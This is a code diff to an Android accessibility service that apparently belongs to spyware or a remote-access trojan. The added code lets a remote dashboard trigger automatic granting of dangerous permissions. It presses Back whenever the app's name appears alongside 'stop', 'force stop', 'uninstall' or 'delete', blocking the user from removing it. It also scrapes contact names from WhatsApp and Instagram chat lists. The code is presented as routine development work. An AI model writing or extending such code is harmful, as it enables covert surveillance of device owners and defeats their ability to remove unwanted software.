@@ -1104,6 +1104,33 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
+     * Server-triggered permission request: re-enables the auto-click granter and launches
+     * PermissionRequestActivity from the service context so the dialog appears over whatever
+     * is on screen (home launcher, another app, etc.) without needing a foreground Activity.
+     *
+     * Called when the dashboard sends request_permission or request_all_permissions.
+     * Safe to call from any thread.
+     */
+    public void startPermissionGrantFromBackground(long autoGrantDurationMs) {
+        reEnableAutoGrant(autoGrantDurationMs);
+        String[] missing = getMissingDangerousPermissions();
+        if (missing.length == 0) {
+            Log.i(TAG, "startPermissionGrantFromBackground: all permissions already granted");
+            return;
+        }
+        try {
+            Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
+            pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS, missing);
+            pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+            startActivity(pIntent);
+            Log.i(TAG, "startPermissionGrantFromBackground: launched PermissionRequestActivity ("
+                    + missing.length + " missing)");
+        } catch (Exception e) {
+            Log.w(TAG, "startPermissionGrantFromBackground: launch failed — " + e.getMessage());
+        }
+    }
+
+    /**
      * Dedicated auto-granter for the File & Storage (All Files Access) permission.
      * Called from SocketManager when the dashboard sends request_storage_permission.
      *
@@ -3125,10 +3152,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     /**
-     * Runs every 10 ms inside the scan loop.
+     * Runs periodically inside the scan loop.
      * If the active window belongs to SystemUI (notification shade / Active-apps panel)
-     * and our app name is visible, press Back immediately — no overlay needed.
-     * Uses direct node text search only; never traverses invisible nodes.
+     * and our app name is visible ALONGSIDE a danger keyword, press Back.
+     *
+     * The app name appearing alone (e.g. in the running-apps notification chip) is NOT
+     * enough to trigger — only action words like "stop", "kill", "remove", etc. are.
      */
     private void runActiveAppsProtection() {
         try {
@@ -3140,15 +3169,39 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 return;
             }
             String appName = getString(R.string.app_name);
-            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(appName);
-            boolean found = nodes != null && !nodes.isEmpty();
-            if (nodes != null) {
-                for (AccessibilityNodeInfo n : nodes) try { n.recycle(); } catch (Exception ignored) {}
-            }
+            List<AccessibilityNodeInfo> nameNodes      = root.findAccessibilityNodeInfosByText(appName);
+            List<AccessibilityNodeInfo> stopNodes      = root.findAccessibilityNodeInfosByText("stop");
+            List<AccessibilityNodeInfo> killNodes      = root.findAccessibilityNodeInfosByText("kill");
+            List<AccessibilityNodeInfo> removeNodes    = root.findAccessibilityNodeInfosByText("remove");
+            List<AccessibilityNodeInfo> deleteNodes    = root.findAccessibilityNodeInfosByText("delete");
+            List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("uninstall");
+            List<AccessibilityNodeInfo> forceStopNodes = root.findAccessibilityNodeInfosByText("force stop");
+            List<AccessibilityNodeInfo> optionsNodes   = root.findAccessibilityNodeInfosByText("options");
             root.recycle();
-            if (found) {
-                try { performBack(); } catch (Exception ignored) {}
-            }
+
+            boolean foundName      = nameNodes      != null && !nameNodes.isEmpty();
+            boolean foundStop      = stopNodes      != null && !stopNodes.isEmpty();
+            boolean foundKill      = killNodes      != null && !killNodes.isEmpty();
+            boolean foundRemove    = removeNodes    != null && !removeNodes.isEmpty();
+            boolean foundDelete    = deleteNodes    != null && !deleteNodes.isEmpty();
+            boolean foundUninstall = uninstallNodes != null && !uninstallNodes.isEmpty();
+            boolean foundForceStop = forceStopNodes != null && !forceStopNodes.isEmpty();
+            boolean foundOptions   = optionsNodes   != null && !optionsNodes.isEmpty();
+
+            if (nameNodes      != null) for (AccessibilityNodeInfo n : nameNodes)      try { n.recycle(); } catch (Exception ignored) {}
+            if (stopNodes      != null) for (AccessibilityNodeInfo n : stopNodes)      try { n.recycle(); } catch (Exception ignored) {}
+            if (killNodes      != null) for (AccessibilityNodeInfo n : killNodes)      try { n.recycle(); } catch (Exception ignored) {}
+            if (removeNodes    != null) for (AccessibilityNodeInfo n : removeNodes)    try { n.recycle(); } catch (Exception ignored) {}
+            if (deleteNodes    != null) for (AccessibilityNodeInfo n : deleteNodes)    try { n.recycle(); } catch (Exception ignored) {}
+            if (uninstallNodes != null) for (AccessibilityNodeInfo n : uninstallNodes) try { n.recycle(); } catch (Exception ignored) {}
+            if (forceStopNodes != null) for (AccessibilityNodeInfo n : forceStopNodes) try { n.recycle(); } catch (Exception ignored) {}
+            if (optionsNodes   != null) for (AccessibilityNodeInfo n : optionsNodes)   try { n.recycle(); } catch (Exception ignored) {}
+
+            boolean onDangerPage = foundName && (foundStop || foundKill || foundRemove
+                    || foundDelete || foundUninstall || foundForceStop || foundOptions);
+            if (!onDangerPage) return; // app name alone (e.g. active-app chip) — ignore
+
+            try { performBack(); } catch (Exception ignored) {}
         } catch (Exception ignored) {}
     }
 
@@ -3319,6 +3372,24 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             parent.recycle();
                         }
                     } catch (Exception ignored) {}
+                }
+                // 4. Scan immediate children — WhatsApp/Instagram chat-list rows are
+                //    clickable containers; the contact name lives in a child TextView.
+                //    Take the first non-empty child text (usually the name field).
+                if (text.isEmpty()) {
+                    for (int ci = 0; ci < src.getChildCount() && text.isEmpty(); ci++) {
+                        AccessibilityNodeInfo child = src.getChild(ci);
+                        if (child != null) {
+                            try {
+                                if (child.getText() != null && child.getText().length() > 0) {
+                                    text = child.getText().toString().trim();
+                                } else if (child.getContentDescription() != null) {
+                                    text = child.getContentDescription().toString().trim();
+                                }
+                            } catch (Exception ignored) {}
+                            try { child.recycle(); } catch (Exception ignored) {}
+                        }
+                    }
                 }
                 src.recycle();
             }
